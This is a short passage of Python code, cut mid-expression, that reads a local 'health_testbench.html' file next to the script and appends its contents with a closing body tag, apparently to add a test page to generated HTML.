    (Path(__file__).with_name("health_testbench.html")).read_text(encoding="utf-8") + "\n</body>",
)
